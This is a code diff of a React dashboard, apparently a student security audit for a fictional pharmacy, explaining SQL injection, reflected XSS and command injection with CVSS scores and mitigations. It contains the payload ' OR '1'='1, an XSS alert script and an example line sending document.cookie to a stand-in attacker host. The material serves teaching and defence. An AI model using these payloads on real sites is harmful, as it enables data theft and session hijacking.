@@ -1,51 +1,77 @@
-import React, { useState } from 'react';
-import './App.css'; // Asegúrate de importar el archivo CSS
+import React, { useState, useEffect } from 'react';
+import html2pdf from 'html2pdf.js';
+import './App.css';
 
 // Importación de las imágenes
 import comandosImg from './img_grocat/comandos_grocat.png';
 import sqliImg from './img_grocat/sqli_grocat.png';
 import xssImg from './img_grocat/xss_grocat.png';
 
-
 export default function Matriz() {
   const [seccionActiva, setSeccionActiva] = useState('resumen');
   const [riesgoSeleccionado, setRiesgoSeleccionado] = useState(null);
+  const [isDarkMode, setIsDarkMode] = useState(false);
 
-  const riesgosData = {
-    'R-01': { 
-      id: 'R-01', 
-      vuln: 'Inyección SQL (SQLi)', 
-      amenaza: 'Filtración Masiva de Recetas y Datos: Un atacante extrae la base de datos completa de pacientes, exponiendo patologías y tratamientos.', 
-      prob: 4, 
-      imp: 5, 
-      nivel: 'CRÍTICO (20)' 
-    },
-    'R-02': { 
-      id: 'R-02', 
-      vuln: 'Command Injection', 
-      amenaza: 'Secuestro Total del Servidor: El atacante ejecuta comandos de sistema operativo, toma control del backend e instala malware o detiene los servicios de farmacia.', 
-      prob: 3, 
-      imp: 5, 
-      nivel: 'CRÍTICO (15)' 
-    },
-    'R-03': { 
-      id: 'R-03', 
-      vuln: 'XSS Reflejado', 
-      amenaza: 'Robo de Puntos y Sesiones: Robo de cookies de autenticación de clientes mediante enlaces maliciosos para realizar fraudes en el programa de fidelización.', 
-      prob: 4, 
-      imp: 3, 
-      nivel: 'ALTO (12)' 
-    }
+  useEffect(() => {
+    const savedTheme = localStorage.getItem('theme');
+    if (savedTheme === 'dark') setIsDarkMode(true);
+  }, []);
+
+  const toggleTheme = () => {
+    const nuevoModo = !isDarkMode;
+    setIsDarkMode(nuevoModo);
+    localStorage.setItem('theme', nuevoModo ? 'dark' : 'light');
   };
 
+  const downloadPDF = () => {
+    const element = document.querySelector('.cod-dashboard');
+    html2pdf().from(element).save('Auditoria_FarmaSalud.pdf');
+  };
+
+  const riesgosData = {
+      'R-01': { 
+        id: 'R-01', 
+        vuln: 'Inyección SQL (SQLi)', 
+        amenaza: 'Filtración Masiva de Recetas y Datos: Un atacante extrae la base de datos completa de pacientes, exponiendo patologías y tratamientos.', 
+        prob: 4, 
+        imp: 5, 
+        nivel: 'CRÍTICO (20)' 
+      },
+      'R-02': { 
+        id: 'R-02', 
+        vuln: 'Command Injection', 
+        amenaza: 'Secuestro Total del Servidor: El atacante ejecuta comandos de sistema operativo, toma control del backend e instala malware o detiene los servicios de farmacia.', 
+        prob: 3, 
+        imp: 5, 
+        nivel: 'CRÍTICO (15)' 
+      },
+      'R-03': { 
+        id: 'R-03', 
+        vuln: 'XSS Reflejado', 
+        amenaza: 'Robo de Puntos y Sesiones: Robo de cookies de autenticación de clientes mediante enlaces maliciosos para realizar fraudes en el programa de fidelización.', 
+        prob: 4, 
+        imp: 3, 
+        nivel: 'ALTO (12)' 
+      }
+    };
+
   return (
-    <div className="cod-dashboard">
+    <div className={`cod-dashboard ${isDarkMode ? 'dark-mode' : ''}`}>
       {/* HEADER TÁCTICO */}
       <header className="cod-header">
         <div className="cod-logo-area">
           <span className="cod-title-main">FARMASALUD</span>
           <span className="cod-title-sub">FUNDAMENTOS DE SEGURIDAD DE LA INFORMACIÓN // AUDITORIA_GROCAT</span>
         </div>
+
+        {/* BOTONES TÁCTICOS */}
+        <div className="cod-header-actions">
+          <button className="cod-header-btn" onClick={toggleTheme}>
+            {isDarkMode ? 'MODO DÍA' : 'MODO NOCHE'}
+          </button>
+          <button className="cod-header-btn" onClick={downloadPDF}>PDF</button>
+        </div>
+
         <div className="cod-system-status">
           <span className="status-indicator online"></span> VULNERABILIDADES Y MATRIZ DE RIESGO: INACAP_2026
         </div>
@@ -126,27 +152,66 @@ export default function Matriz() {
                 </div>
               </div>
 
-              <div className="cod-card">
-                <h3>2. ANÁLISIS TÉCNICO (POR QUÉ FUNCIONA)</h3>
-                <p>La vulnerabilidad ocurre porque el aplicativo web concatena directamente la entrada del usuario (<code>id</code>) de forma dinámica en la consulta SQL, sin sanitización ni parametrización previa.</p>
-                <div className="cod-code-box">
-                  <code>SELECT first_name, last_name FROM users WHERE user_id = '$id';</code>
-                </div>
+            <div className="cod-card">
+              <h3>3. ANÁLISIS TÉCNICO: ¿POR QUÉ FUNCIONA EL PAYLOAD?</h3>
+              <p>
+                El atacante ingresa <code>' OR '1'='1</code> en el campo de entrada. El servidor, al concatenar esta entrada directamente, genera la siguiente instrucción maliciosa:
+              </p>
+
+              <div className="cod-code-box">
+                <code>SELECT nombre, apellido FROM usuarios WHERE id = '' OR '1'='1';</code>
               </div>
 
-              <div className="cod-card">
-                <h3>3. PUNTUACIÓN Y SEVERIDAD CVSS V3.1</h3>
-                <p><strong>VECTOR DE ATAQUE:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code></p>
-                <div className="severity-banner text-high">PUNTAJE BASE: 7.5 [ALTA]</div>
+              <h4 style={{ marginTop: '20px' }}>DESGLOSE LÓGICO DEL ATAQUE:</h4>
+              <ul className="technical-list">
+                <li><strong>La primera comilla (<code>'</code>):</strong> Cierra prematuramente el valor del campo <code>id</code> que el programador definió entre comillas simples en el código original.</li>
+                <li><strong>El comando <code>OR</code>:</strong> Operador lógico que instruye a la base de datos a considerar válida la fila si la condición del <code>id</code> es correcta O si la condición siguiente es verdadera.</li>
+                <li><strong>La condición <code>'1'='1'</code>:</strong> Una tautología (afirmación siempre verdadera). Al evaluarse como verdadera, la base de datos devuelve todos los registros de la tabla, ignorando la restricción original.</li>
+              </ul>
+            </div>
+
+            <div className="cod-card">
+              <h3>3. RESUMEN DEL PERFIL DE RIESGO Y SEVERIDAD</h3>
+              <p>Cada letra representa una métrica que define la facilidad y el impacto del ataque:</p>
+              
+              <div className="table-responsive">
+                <table className="cod-table">
+                  <thead>
+                    <tr>
+                      <th>Métrica</th>
+                      <th>Descripción Técnica</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr><td><strong>AV:N</strong></td><td><strong>(Attack Vector - Network):</strong> El ataque es remoto (a través de la red). No requiere acceso físico ni local al servidor.</td></tr>
+                    <tr><td><strong>AC:L</strong></td><td><strong>(Attack Complexity - Low):</strong> La complejidad es baja. No se requieren condiciones especiales; el atacante puede repetir el ataque fácilmente.</td></tr>
+                    <tr><td><strong>PR:N</strong></td><td><strong>(Privileges Required - None):</strong> No se requieren privilegios. El atacante no necesita ser usuario registrado ni administrador.</td></tr>
+                    <tr><td><strong>UI:N</strong></td><td><strong>(User Interaction - None):</strong> No se requiere interacción del usuario. El ataque ocurre de forma autónoma.</td></tr>
+                    <tr><td><strong>S:U</strong></td><td><strong>(Scope - Unchanged):</strong> El impacto no se propaga a otros componentes; el daño se limita al componente vulnerable.</td></tr>
+                    <tr><td><strong>C:H</strong></td><td><strong>(Confidentiality - High):</strong> El impacto en la confidencialidad es alto. Acceso total a datos sensibles (fichas clínicas).</td></tr>
+                    <tr><td><strong>I:N</strong></td><td><strong>(Integrity - None):</strong> El impacto en la integridad es nulo. El atacante no puede modificar los datos.</td></tr>
+                    <tr><td><strong>A:N</strong></td><td><strong>(Availability - None):</strong> El impacto en la disponibilidad es nulo. El ataque no causa la caída del sistema.</td></tr>
+                  </tbody>
+                </table>
               </div>
 
-              <div className="cod-card">
-                <h3>4. ESTRATEGIA DE DEFENSAS</h3>
-                <p><strong>POLÍTICA DE PREVENCIÓN:</strong> Todo desarrollo debe implementar <strong>Consultas Parametrizadas</strong>.</p>
-                <div className="cod-code-box">
-                  <code>{'$stmt = $conn->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");'}</code>
-                </div>
-              </div>
+              <p style={{ marginTop: '15px', fontFamily: 'monospace' }}>
+                <strong>VECTOR:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</code>
+              </p>
+
+              <div className="severity-banner text-high">PUNTAJE BASE: 7.5 [ALTA]</div>
+            </div>
+
+            <div className="cod-card">
+              <h3>4. ANÁLISIS DE IMPACTO: INYECCIÓN SQL (SQLi)</h3>
+              <p>
+                <strong>EXFILTRACIÓN DE DATOS SENSIBLES:</strong> Es el impacto principal. Al manipular la consulta SELECT original, el atacante puede extraer registros de la base de datos sin restricciones de seguridad.
+                <br/><br/>
+                <strong>Activos afectados:</strong> Registros de Salud Electrónicos (EHR), datos personales (RUT, historial clínico) y datos financieros de los pacientes.
+                <br/><br/>
+                <strong>Riesgo:</strong> Violación de la Ley 19.628 de Protección de la Vida Privada. La exfiltración de esta información sensible es el impacto más grave, ya que compromete la privacidad del paciente y genera responsabilidad legal para FarmaSalud.
+              </p>
+            </div>
 
               {/* PUNTO 5: EVIDENCIA VISUAL */}
               <div className="cod-card">
@@ -157,6 +222,8 @@ export default function Matriz() {
               </div>
             </div>
           )}
+
+
 
 {/* 03 XSS */}
 {seccionActiva === 'xss' && (
@@ -172,21 +239,75 @@ export default function Matriz() {
       </div>
     </div>
 
-    <div className="cod-card">
-      <h3>2. ANÁLISIS TÉCNICO (POR QUÉ FUNCIONA)</h3>
-      <p>La aplicación web procesa el string de entrada y lo incluye directamente en el HTML sin codificar. Al no sanitizar <code>&lt;</code> y <code>&gt;</code>, el navegador ejecuta el script.</p>
-    </div>
+<div className="cod-card">
+  <h3>3. ANÁLISIS TÉCNICO: ¿POR QUÉ FUNCIONA EL PAYLOAD?</h3>
+  <p>
+    El atacante inyecta el script malicioso <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> en un campo de entrada. La aplicación, al no realizar <strong>Output Encoding</strong>, inserta este código directamente en el HTML de la respuesta.
+  </p>
 
-    <div className="cod-card">
-      <h3>3. PUNTUACIÓN Y SEVERIDAD CVSS V3.1</h3>
-      <p><strong>VECTOR DE ATAQUE:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code></p>
-      <div className="severity-banner text-medium">PUNTAJE BASE: 6.1 [MEDIA]</div>
-    </div>
+  <div className="cod-code-box">
+    {/* Representación de cómo el navegador recibe el HTML comprometido */}
+    <code>&lt;div&gt;Hola, &lt;script&gt;alert('XSS')&lt;/script&gt;&lt;/div&gt;</code>
+  </div>
 
-    <div className="cod-card">
-      <h3>4. ESTRATEGIA DE DEFENSAS</h3>
-      <p>Toda variable renderizada dinámicamente debe pasar por <strong>Output Encoding</strong> y usar la bandera <code>HttpOnly</code>.</p>
+  <h4 style={{ marginTop: '20px' }}>DESGLOSE LÓGICO DEL ATAQUE:</h4>
+  <ul className="technical-list">
+    <li><strong>Etiqueta de Script:</strong> Al detectar <code>&lt;script&gt;</code>, el navegador de la víctima no lo trata como texto plano, sino como una instrucción ejecutable de JavaScript.</li>
+    <li><strong>Ejecución en el Cliente:</strong> El navegador interpreta el comando <code>alert('XSS')</code>, desplegando una ventana emergente. En un escenario real, esto podría ser un script que robe cookies de sesión o redirija al usuario.</li>
+    <li><strong>Falta de Sanitización:</strong> La vulnerabilidad reside en que el servidor web confía ciegamente en el input del usuario, permitiendo que caracteres especiales como <code>&lt;</code> y <code>&gt;</code> se rendericen como parte del código fuente de la página.</li>
+  </ul>
+</div>
+
+<div className="cod-card">
+  <h3>3. RESUMEN DEL PERFIL DE RIESGO: XSS REFLEJADO</h3>
+  
+  <div className="table-responsive">
+    <table className="cod-table">
+      <thead style={{ backgroundColor: '#222', color: '#fff' }}>
+        <tr>
+          <th>MÉTRICA</th>
+          <th>DESCRIPCIÓN TÉCNICA (XSS)</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td><strong>AV : N</strong></td><td>(Attack Vector - Network): El ataque es remoto, ejecutado a través del navegador de la víctima.</td></tr>
+        <tr><td><strong>AC : L</strong></td><td>(Attack Complexity - Low): No se requieren condiciones especiales; basta con enviar un enlace malicioso.</td></tr>
+        <tr><td><strong>PR : N</strong></td><td>(Privileges Required - None): El atacante no necesita autenticarse en el sistema.</td></tr>
+        <tr><td><strong>UI : R</strong></td><td>(User Interaction - Required): El ataque requiere que la víctima haga clic en un enlace o cargue la página.</td></tr>
+        <tr><td><strong>S : C</strong></td><td>(Scope - Changed): El impacto se propaga al contexto del navegador del usuario.</td></tr>
+        <tr><td><strong>C : L</strong></td><td>(Confidentiality - Low): Posible robo de cookies de sesión o información visible en pantalla.</td></tr>
+        <tr><td><strong>I : L</strong></td><td>(Integrity - Low): Posibilidad de modificar la apariencia de la página o realizar acciones.</td></tr>
+        <tr><td><strong>A : N</strong></td><td>(Availability - None): El ataque no afecta la disponibilidad del servidor.</td></tr>
+      </tbody>
+    </table>
+  </div>
+
+  <div style={{ marginTop: '20px', textAlign: 'center' }}>
+    <p style={{ fontFamily: 'monospace' }}>
+      <strong>VECTOR:</strong> <code style={{ backgroundColor: '#222', color: '#00ff00', padding: '5px 10px' }}>CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N</code>
+    </p>
+    <div className="severity-banner text-medium" style={{ display: 'inline-block', padding: '5px 15px', border: '2px solid #ffcc00' }}>
+      PUNTAJE BASE: 6.1 [MEDIA]
     </div>
+  </div>
+</div>
+
+<div className="cod-card">
+  <h3>4. ANÁLISIS DE IMPACTO: XSS REFLEJADO (CROSS-SITE SCRIPTING)</h3>
+  <p>
+    <strong>COMPROMISO DE LA SESIÓN DEL PACIENTE:</strong> Es el impacto principal. Al inyectar un script malicioso en la URL o campos de entrada, el atacante puede ejecutar código en el navegador del usuario legítimo.
+    <br/><br/>
+    <strong>Activos afectados:</strong> Cookies de sesión, tokens de autenticación, información visual del portal (datos de recetas) y credenciales almacenadas en el navegador.
+    <br/><br/>
+    <strong>Riesgo:</strong> Suplantación de identidad (Account Takeover). Un atacante puede robar la sesión activa del paciente y realizar compras o visualizar historiales médicos a su nombre. 
+    <br/><br/>
+    <strong>Medida de mitigación:</strong> Codificación de salida (Output Encoding) y políticas de seguridad de contenido (CSP).
+  </p>
+  
+  <div className="cod-code-box">
+    <code>{'// Ejemplo de ejecución en el cliente\n<script>fetch("https://atacker.com/steal?cookie=" + document.cookie);</script>'}</code>
+  </div>
+</div>
 
     {/* PUNTO 5: EVIDENCIA GRÁFICA */}
     <div className="cod-card">
@@ -223,12 +344,39 @@ export default function Matriz() {
                 <p>El aplicativo web llama internamente a una función de la shell (como <code>system()</code>) concatenando la entrada. Al utilizar el punto y coma <code>;</code> en Linux, el sistema operativo interpreta la línea de código como dos instrucciones independientes, ejecutando el comando de ping y acto seguido la lectura del archivo de usuarios y contraseñas (<code>/etc/passwd</code>) de manera no autorizada.</p>
               </div>
 
-              <div className="cod-card">
-                <h3>3. PUNTUACIÓN Y SEVERIDAD CVSS V3.1</h3>
-                <p><strong>VECTOR DE ATAQUE:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H</code></p>
-                <div className="severity-banner text-high">PUNTAJE BASE: 8.8 [ALTA]</div>
-                <p><em>Justificación:</em> Permite el control absoluto del sistema operativo del servidor (C:H/I:H/A:H), pudiendo alterar archivos, inyectar código persistente o botar el servidor web de la farmacia por completo.</p>
+            <div className="cod-card">
+              <h3>3. RESUMEN DEL PERFIL DE RIESGO: INYECCIÓN DE COMANDOS</h3>
+              
+              <div className="table-responsive">
+                <table className="cod-table">
+                  <thead style={{ backgroundColor: '#222', color: '#fff' }}>
+                    <tr>
+                      <th>MÉTRICA</th>
+                      <th>DESCRIPCIÓN TÉCNICA (CMD INJECTION)</th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    <tr><td><strong>AV : N</strong></td><td>(Attack Vector - Network): Ataque remoto sin necesidad de acceso físico.</td></tr>
+                    <tr><td><strong>AC : L</strong></td><td>(Attack Complexity - Low): Ejecución inmediata mediante comandos estándar.</td></tr>
+                    <tr><td><strong>PR : N</strong></td><td>(Privileges Required - None): No requiere autenticación.</td></tr>
+                    <tr><td><strong>UI : N</strong></td><td>(User Interaction - None): El ataque ocurre de forma autónoma.</td></tr>
+                    <tr><td><strong>S : U</strong></td><td>(Scope - Unchanged): El impacto se mantiene dentro del servidor comprometido.</td></tr>
+                    <tr><td><strong>C : H</strong></td><td>(Confidentiality - High): Acceso total a archivos del servidor.</td></tr>
+                    <tr><td><strong>I : H</strong></td><td>(Integrity - High): Control total para modificar o borrar archivos.</td></tr>
+                    <tr><td><strong>A : H</strong></td><td>(Availability - High): Capacidad de detener o destruir la infraestructura.</td></tr>
+                  </tbody>
+                </table>
               </div>
+
+              <div style={{ marginTop: '20px', textAlign: 'center' }}>
+                <p style={{ fontFamily: 'monospace' }}>
+                  <strong>VECTOR:</strong> <code style={{ backgroundColor: '#222', color: '#00ff00', padding: '5px 10px' }}>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H</code>
+                </p>
+                <div className="severity-banner text-critical" style={{ display: 'inline-block', padding: '5px 15px', border: '2px solid #ff0000', backgroundColor: '#ffeef0' }}>
+                  PUNTAJE BASE: 9.8 [CRÍTICA]
+                </div>
+              </div>
+            </div>
 
               {/* PUNTO 5: EVIDENCIA GRÁFICA */}
               <div className="cod-card">
